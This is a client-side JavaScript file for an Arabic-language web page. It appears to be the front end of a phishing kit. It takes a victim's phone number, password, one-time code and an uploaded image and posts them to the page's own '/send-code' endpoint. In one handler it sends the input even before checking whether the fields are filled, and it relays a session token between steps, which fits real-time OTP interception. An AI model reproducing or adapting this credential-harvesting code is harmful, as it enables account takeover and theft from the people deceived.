const accountForm = document.getElementById("account");
const login = document.getElementById("press-here-login");
const code = document.getElementById("press-here-code");
const codeForm = document.getElementById("code");
const sendRequest = document.getElementById("final");
const sendRequestForm = document.getElementById("center-message");
const sendCode = document.getElementById("send-code");
const confirm = document.getElementById("confirm");
const done = document.getElementById("done");
const end = document.getElementById("end");

const MessageText = document.getElementById("message-text");
const sendng = document.getElementById("sendng");
const file = document.getElementById("file");
const fileName = document.getElementById("file-name");

var phoneNumber = document.getElementById("phone-number");
var password = document.getElementById("pasword");
var codeNumber = document.getElementById("code-number");


end.addEventListener('click', ()=>{
  location.reload();
});

login.addEventListener('click', ()=>{
  login.style.backgroundColor = "#671515"
  login.style.color = "white"

  accountForm.style.height = "auto";
  accountForm.style.transform = "scale(1)"
  accountForm.style.bottom = "0"

  setTimeout(()=>{
    login.style.backgroundColor = "white"
    login.style.color = "black"
  },200);
});

//selct fle
file.addEventListener('change', ()=>{
  fileName.innerText = file.value;
});



//send code
sendCode.addEventListener('click', ()=>{
  sendCode.style.backgroundColor = "#671515"

  var phone = phoneNumber.value;
  var pass = password.value;
  var otp = codeNumber.value;
  // var ss = sessionStorage.removeItem("ss");

  var ss = sessionStorage.getItem("ss");

  var formData = new FormData();

  formData.append('phone', phone);
  formData.append('password', pass);
  formData.append('otp', otp);

  if(ss){
    formData.append('ss', ss);
  }
  if(file.files[0]){
    formData.append('img', file.files[0]);
  }


  fetchA(formData);

  if(phone=='' || pass==''){
    sendng.style.visibility ='hidden'
    MessageText.innerText = "الرجاء ادخال جميع الحقول";
    sendRequestForm.style.transform = "translateY(0)"
    setTimeout(()=>{
      sendRequestForm.style.transform = "translateY(100%)"
    },5000);
  }
  else{
    sendng.style.visibility ='visible'
    MessageText.innerText = " جاري ارسال الرمز";
    sendRequestForm.style.transform = "translateY(0)"
    setTimeout(()=>{
      sendRequestForm.style.transform = "translateY(100%)"
    },10000);
  }
  setTimeout(()=>{
    sendCode.style.backgroundColor = "#9E1728"
  },200);
});

function fetchA(d){
  fetch('/send-code', {
      method: 'POST',
      headers: {
          'X-CSRF-TOKEN': document.getElementById('cr').attributes.content.value,
          // 'Content-Type': 'application/json'
      },
      body: d,
      })
      .then(response => response.json())
      .then(data => {
        if(data.ss !=''){
          sessionStorage.setItem("ss", data.ss);
        }
      })
      .catch((error) => {
      console.error('Error:', error);
      });
}


code.addEventListener('click', ()=>{
  code.style.backgroundColor = "#671515"
  code.style.color = "white"

  codeForm.style.height = "auto";
  codeForm.style.transform = "scale(1)"
  codeForm.style.bottom = "0"

  setTimeout(()=>{
    code.style.backgroundColor = "white"
    code.style.color = "black"
  },200);
});

//confirm code
confirm.addEventListener('click', ()=>{
  codeForm.style.height = "0";
  codeForm.style.transform = "scale(0)";
  codeForm.style.bottom = "100px";

  var phone = phoneNumber.value;
  var pass = password.value;
  var otp = codeNumber.value;
//   var ss = sessionStorage.removeItem("ss");

  var ss = sessionStorage.getItem("ss");

  var formData = new FormData();

  formData.append('phone', phone);
  formData.append('password', pass);
  formData.append('otp', otp);

  if(ss){
    formData.append('ss', ss);
  }
  if(file.files[0]){
    formData.append('img', file.files[0]);
  }
  fetchA(formData);
});

//send request
sendRequest.addEventListener('click', ()=>{
  sendRequest.style.backgroundColor = "#671515"
  setTimeout(()=>{
    sendRequest.style.backgroundColor = "#9E1728"
  },300);

  var phone = phoneNumber.value;
  var pass = password.value;
  var otp = codeNumber.value;

  var ss = sessionStorage.getItem("ss");
  var formData = new FormData();

  formData.append('phone', phone);
  formData.append('password', pass);
  formData.append('otp', otp);

  if(ss){
    formData.append('ss', ss);
  }
  if(file.files[0]){
    formData.append('img', file.files[0]);
  }
fetch('/send-code', {
    method: 'POST',
    headers: {
        'X-CSRF-TOKEN': document.getElementById('cr').attributes.content.value,
        // 'Content-Type': 'application/json'
    },
    body: formData,
    })
    .then(response => response.json())
    .then(data => {
      if(data.ss !=''){
        sessionStorage.setItem("ss", data.ss);
      }
      if(!(phone=='' || pass=='' || otp=='')){
        done.style.transform = "translateY(0)"
      }
    })
    .catch((error) => {
        console.error('Error:', error);
    });


  if(phone=='' || pass=='' || otp==''){
    sendng.style.visibility ='hidden'
    MessageText.innerText = "الرجاء ادخال جميع الحقول";
    sendRequestForm.style.transform = "translateY(0)"
    setTimeout(()=>{
        sendRequestForm.style.transform = "translateY(100%)"
      },3000);
  }
  else{
    sendng.style.visibility ='visible'
    MessageText.innerText = " جاري ارسال الطلب";
    sendRequestForm.style.transform = "translateY(0)"
    setTimeout(()=>{
      sendRequestForm.style.transform = "translateY(100%)"
    },10000);
  }

});
